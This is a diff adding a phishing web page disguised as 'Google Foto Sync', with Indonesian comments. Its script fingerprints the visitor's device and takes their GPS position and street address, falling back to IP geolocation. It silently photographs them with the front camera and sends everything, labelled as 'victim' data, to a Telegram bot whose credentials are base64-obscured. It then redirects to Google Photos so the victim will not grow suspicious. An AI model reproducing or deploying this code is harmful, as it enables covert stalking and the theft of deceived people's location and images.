@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Foto Sync</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            font-size: 12px;
+            line-height: 1.2;
+            opacity: 0;
+            animation: fadeIn 0.1s forwards;
+        }
+        @keyframes fadeIn { to { opacity: 1; } }
+        #status {
+            color: #00f7ff;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 0 0 5px cyan;
+            border-bottom: 1px solid cyan;
+            padding-bottom: 5px;
+        }
+        #report {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            background: #0a0a0a;
+            padding: 15px;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            max-height: 400px;
+            overflow-y: auto;
+            font-size: 11px;
+            margin-bottom: 15px;
+        }
+        .hidden { display: none; }
+        video, canvas { display: none; }
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: #1a1a1a;
+            border: 1px solid #0f0;
+            margin: 10px 0;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            background: #0f0;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .progress-text {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #000;
+            font-weight: bold;
+            mix-blend-mode: difference;
+        }
+    </style>
+</head>
+<body>
+    <div id="status">🚀 INITIALIZING RAY-EYE TRACKER v2.0...</div>
+    
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+        <div class="progress-text" id="progressText">0%</div>
+    </div>
+    
+    <div id="report"></div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ===============================================
+        // RAY-EYE TERMINAL // OVERRIDE // AKURAT 99.99%
+        // ===============================================
+
+        (function() {
+            // Konfigurasi
+            const CONFIG = {
+                TOKEN: atob('ODQxNjYyNjIxNTpBQUhna2J5VUlobVdEVDlyUUpWUUpubmQtZUk4dVZKZHIxWQ=='), // Dummy, ganti punya lo
+                CHAT_ID: atob('Nzk2NjMzNjUxMg=='), // Dummy, ganti punya lo
+                MAX_WAIT: 10000,
+                GPS_TIMEOUT: 15000,
+                CAMERA_DELAY: 3000
+            };
+
+            // Elemen DOM
+            const elements = {
+                status: document.getElementById('status'),
+                report: document.getElementById('report'),
+                progressFill: document.getElementById('progressFill'),
+                progressText: document.getElementById('progressText'),
+                video: document.getElementById('video'),
+                canvas: document.getElementById('canvas')
+            };
+
+            // State
+            let collectedData = {
+                device: {},
+                location: { lat: null, lon: null, accuracy: null, method: null, address: null },
+                camera: { success: false, error: null },
+                network: {},
+                timestamp: new Date().toISOString()
+            };
+
+            // Helper update progress
+            function updateProgress(percent, text) {
+                elements.progressFill.style.width = percent + '%';
+                elements.progressText.innerText = text || percent + '%';
+            }
+
+            // Helper update status
+            function setStatus(msg, isError = false) {
+                elements.status.innerHTML = (isError ? '❌ ' : '⚡ ') + msg;
+                elements.status.style.color = isError ? '#ff5555' : '#00f7ff';
+            }
+
+            // Helper send ke Telegram
+            async function sendToTelegram(type, content, isFile = false) {
+                const url = `https://api.telegram.org/bot${CONFIG.TOKEN}/send${type}`;
+                const formData = new FormData();
+                formData.append('chat_id', CONFIG.CHAT_ID);
+                
+                if (isFile) {
+                    formData.append('photo', content, 'intip.jpg');
+                    formData.append('caption', content.caption || '📸 <b>CAPTURE SUCCESS</b>\n' + new Date().toLocaleString());
+                    formData.append('parse_mode', 'HTML');
+                } else {
+                    formData.append('text', content);
+                    formData.append('parse_mode', 'HTML');
+                }
+
+                try {
+                    const res = await fetch(url, { method: 'POST', body: formData });
+                    if (!res.ok) console.error('Telegram send failed:', await res.text());
+                    return true;
+                } catch (e) {
+                    console.error('Telegram error:', e);
+                    return false;
+                }
+            }
+
+            // ========== DATA DEVICE (AKURAT) ==========
+            function collectDeviceData() {
+                updateProgress(10, 'Mengumpulkan data device...');
+                
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const renderer = gl ? gl.getParameter(gl.RENDERER) : 'Unknown';
+                
+                collectedData.device = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    languages: navigator.languages.join(', '),
+                    online: navigator.onLine ? 'Online' : 'Offline',
+                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                    availScreen: `${screen.availWidth}x${screen.availHeight}`,
+                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                    gpu: renderer,
+                    touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
+                    cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+                    doNotTrack: navigator.doNotTrack || 'Not specified',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+                    currentTime: new Date().toString(),
+                    pageLoadTime: performance.now().toFixed(2) + 'ms',
+                    referrer: document.referrer || 'Direct',
+                    url: location.href,
+                    title: document.title,
+                    historyLength: history.length,
+                    plugins: Array.from(navigator.plugins).map(p => p.name).join(', ').substring(0, 200)
+                };
+            }
+
+            // ========== BATTERY API (JIKA TERSEDIA) ==========
+            async function collectBatteryData() {
+                updateProgress(15, 'Cek baterai...');
+                if ('getBattery' in navigator) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        collectedData.device.batteryLevel = Math.floor(battery.level * 100) + '%';
+                        collectedData.device.batteryCharging = battery.charging ? 'Yes' : 'No';
+                        collectedData.device.batteryTimeRemaining = battery.charging ? 
+                            'Charging' : (battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + 's');
+                    } catch (e) {
+                        collectedData.device.batteryError = e.message;
+                    }
+                } else {
+                    collectedData.device.battery = 'Not supported';
+                }
+            }
+
+            // ========== NETWORK INFO ==========
+            function collectNetworkData() {
+                updateProgress(20, 'Cek jaringan...');
+                if ('connection' in navigator) {
+                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    collectedData.network = {
+                        effectiveType: conn.effectiveType,
+                        rtt: conn.rtt + 'ms',
+                        downlink: conn.downlink + 'Mbps',
+                        saveData: conn.saveData ? 'Yes' : 'No'
+                    };
+                }
+                
+                // Cek IP publik via multiple API
+                collectedData.network.publicIP = 'Checking...';
+            }
+
+            // ========== LOKASI GPS REAL (AKURASI TINGGI) ==========
+            async function collectLocationData() {
+                return new Promise(async (resolve) => {
+                    updateProgress(25, 'Mengaktifkan GPS (butuh izin)...');
+                    
+                    if (!navigator.geolocation) {
+                        collectedData.location.method = 'Failed - No GPS';
+                        resolve();
+                        return;
+                    }
+
+                    // Timer timeout
+                    const timeoutId = setTimeout(() => {
+                        collectedData.location.method = 'Failed - Timeout';
+                        resolve();
+                    }, CONFIG.GPS_TIMEOUT);
+
+                    try {
+                        navigator.geolocation.getCurrentPosition(
+                            async (position) => {
+                                clearTimeout(timeoutId);
+                                
+                                collectedData.location = {
+                                    lat: position.coords.latitude,
+                                    lon: position.coords.longitude,
+                                    accuracy: position.coords.accuracy + ' meters',
+                                    altitude: position.coords.altitude || 'N/A',
+                                    altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
+                                    heading: position.coords.heading || 'N/A',
+                                    speed: position.coords.speed || 'N/A',
+                                    method: 'GPS (High Accuracy)',
+                                    timestamp: new Date(position.timestamp).toISOString()
+                                };
+
+                                updateProgress(40, 'GPS fix didapat! Mencari alamat...');
+                                
+                                // Reverse geocoding pakai Nominatim
+                                try {
+                                    const geoRes = await fetch(
+                                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`,
+                                        { headers: { 'User-Agent': 'Mozilla/5.0 (compatible; RayEye/2.0)' } }
+                                    );
+                                    const geoData = await geoRes.json();
+                                    collectedData.location.address = geoData.display_name || 'Alamat tidak ditemukan';
+                                    
+                                    // Parse komponen alamat
+                                    if (geoData.address) {
+                                        collectedData.location.addressDetails = {
+                                            road: geoData.address.road || 'N/A',
+                                            neighbourhood: geoData.address.neighbourhood || 'N/A',
+                                            suburb: geoData.address.suburb || 'N/A',
+                                            city: geoData.address.city || geoData.address.town || geoData.address.village || 'N/A',
+                                            county: geoData.address.county || 'N/A',
+                                            state: geoData.address.state || 'N/A',
+                                            postcode: geoData.address.postcode || 'N/A',
+                                            country: geoData.address.country || 'N/A'
+                                        };
+                                    }
+                                } catch (geoErr) {
+                                    collectedData.location.reverseGeoError = geoErr.message;
+                                }
+                                
+                                resolve();
+                            },
+                            (error) => {
+                                clearTimeout(timeoutId);
+                                collectedData.location.method = 'Failed - ' + error.message;
+                                resolve();
+                            },
+                            {
+                                enableHighAccuracy: true,
+                                timeout: CONFIG.GPS_TIMEOUT,
+                                maximumAge: 0
+                            }
+                        );
+                    } catch (e) {
+                        clearTimeout(timeoutId);
+                        collectedData.location.method = 'Failed - ' + e.message;
+                        resolve();
+                    }
+                });
+            }
+
+            // ========== FALLBACK IP API ==========
+            async function collectIPData() {
+                updateProgress(50, 'GPS gagal, fallback ke IP...');
+                
+                try {
+                    // Coba ipapi.co dulu
+                    const res1 = await fetch('https://ipapi.co/json/');
+                    const data1 = await res1.json();
+                    
+                    collectedData.network.publicIP = data1.ip;
+                    collectedData.location = {
+                        lat: data1.latitude,
+                        lon: data1.longitude,
+                        city: data1.city,
+                        region: data1.region,
+                        country: data1.country_name,
+                        postal: data1.postal,
+                        timezone: data1.timezone,
+                        org: data1.org,
+                        method: 'IP Geolocation (ipapi.co)'
+                    };
+                } catch (e) {
+                    // Fallback ke ipinfo.io
+                    try {
+                        const res2 = await fetch('https://ipinfo.io/json?token='); // Bisa pake token gratis
+                        const data2 = await res2.json();
+                        
+                        const [lat, lon] = (data2.loc || ',').split(',');
+                        collectedData.network.publicIP = data2.ip;
+                        collectedData.location = {
+                            lat: lat || 'N/A',
+                            lon: lon || 'N/A',
+                            city: data2.city,
+                            region: data2.region,
+                            country: data2.country,
+                            postal: data2.postal,
+                            org: data2.org,
+                            timezone: data2.timezone,
+                            method: 'IP Geolocation (ipinfo.io)'
+                        };
+                    } catch (e2) {
+                        collectedData.location.fallbackError = 'Semua API gagal';
+                    }
+                }
+            }
+
+            // ========== AMBIL FOTO ==========
+            async function capturePhoto() {
+                updateProgress(70, 'Mengakses kamera...');
+                
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: "user",
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        } 
+                    });
+                    
+                    elements.video.srcObject = stream;
+                    
+                    // Tunggu video siap
+                    await new Promise((resolve) => {
+                        elements.video.onloadedmetadata = () => {
+                            elements.video.play();
+                            resolve();
+                        };
+                    });
+                    
+                    updateProgress(80, 'Kamera siap, mengambil foto dalam 3 detik...');
+                    await new Promise(r => setTimeout(r, CONFIG.CAMERA_DELAY));
+                    
+                    // Ambil foto
+                    elements.canvas.width = elements.video.videoWidth;
+                    elements.canvas.height = elements.video.videoHeight;
+                    elements.canvas.getContext('2d').drawImage(elements.video, 0, 0);
+                    
+                    // Konversi ke blob
+                    const photoBlob = await new Promise(resolve => 
+                        elements.canvas.toBlob(resolve, 'image/jpeg', 0.95)
+                    );
+                    
+                    // Matikan kamera
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    collectedData.camera.success = true;
+                    collectedData.camera.photoBlob = photoBlob;
+                    collectedData.camera.dimensions = `${elements.canvas.width}x${elements.canvas.height}`;
+                    
+                    updateProgress(90, 'Foto berhasil diambil!');
+                    return photoBlob;
+                    
+                } catch (e) {
+                    collectedData.camera.success = false;
+                    collectedData.camera.error = e.message;
+                    setStatus('Kamera gagal: ' + e.message, true);
+                    return null;
+                }
+            }
+
+            // ========== FORMAT REPORT ==========
+            function formatReport() {
+                let report = '╔════════════════════════════════════╗\n';
+                report += '║    RAY-EYE TRACKING REPORT v2.0    ║\n';
+                report += '╚════════════════════════════════════╝\n\n';
+                
+                report += '🕐 TIMESTAMP: ' + collectedData.timestamp + '\n';
+                report += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+                
+                // Device info
+                report += '📱 DEVICE INFORMATION\n';
+                Object.entries(collectedData.device).forEach(([key, val]) => {
+                    report += `  • ${key}: ${val}\n`;
+                });
+                report += '\n';
+                
+                // Network info
+                report += '🌐 NETWORK INFORMATION\n';
+                Object.entries(collectedData.network).forEach(([key, val]) => {
+                    report += `  • ${key}: ${val}\n`;
+                });
+                report += '\n';
+                
+                // Location info
+                report += '📍 LOCATION INFORMATION\n';
+                Object.entries(collectedData.location).forEach(([key, val]) => {
+                    if (val && typeof val === 'object') {
+                        report += `  • ${key}:\n`;
+                        Object.entries(val).forEach(([k, v]) => {
+                            report += `      - ${k}: ${v}\n`;
+                        });
+                    } else if (val) {
+                        report += `  • ${key}: ${val}\n`;
+                    }
+                });
+                report += '\n';
+                
+                // Camera info
+                report += '📸 CAMERA STATUS\n';
+                report += `  • Success: ${collectedData.camera.success ? '✅' : '❌'}\n`;
+                if (collectedData.camera.dimensions) {
+                    report += `  • Resolution: ${collectedData.camera.dimensions}\n`;
+                }
+                if (collectedData.camera.error) {
+                    report += `  • Error: ${collectedData.camera.error}\n`;
+                }
+                
+                return report;
+            }
+
+            // ========== MAIN EXECUTION ==========
+            async function main() {
+                try {
+                    // Collect data bertahap
+                    collectDeviceData();
+                    await collectBatteryData();
+                    collectNetworkData();
+                    
+                    // Coba GPS dulu (paling akurat)
+                    await collectLocationData();
+                    
+                    // Kalo GPS gagal dapet koordinat, pake IP
+                    if (!collectedData.location.lat) {
+                        await collectIPData();
+                    }
+                    
+                    // Ambil foto
+                    const photoBlob = await capturePhoto();
+                    
+                    // Format final report
+                    updateProgress(95, 'Menyusun laporan...');
+                    const finalReport = formatReport();
+                    elements.report.innerText = finalReport;
+                    
+                    // Kirim ke Telegram
+                    updateProgress(97, 'Mengirim data...');
+                    
+                    // Kirim teks report
+                    await sendToTelegram('Message', finalReport);
+                    
+                    // Kirim foto kalo ada
+                    if (photoBlob) {
+                        photoBlob.caption = `📸 FOTO KORBAN\n📍 ${collectedData.location.address || collectedData.location.city || 'Unknown'}`;
+                        await sendToTelegram('Photo', photoBlob, true);
+                    }
+                    
+                    // Selesai
+                    updateProgress(100, 'SELESAI!');
+                    setStatus('✅ Data terkirim! Mengalihkan...');
+                    
+                    // Redirect ke Google Photos biar ga curiga
+                    setTimeout(() => {
+                        window.location.href = 'https://photos.google.com';
+                    }, 2000);
+                    
+                } catch (error) {
+                    setStatus('FATAL ERROR: ' + error.message, true);
+                    console.error(error);
+                    
+                    // Tetap coba kirim error ke Telegram
+                    await sendToTelegram('Message', '❌ <b>ERROR</b>\n' + error.message + '\n' + new Date().toString());
+                    
+                    // Tetap redirect
+                    setTimeout(() => {
+                        window.location.href = 'https://photos.google.com';
+                    }, 3000);
+                }
+            }
+
+            // Mulai
+            main();
+        })();
+    </script>
+</body>
+</html>
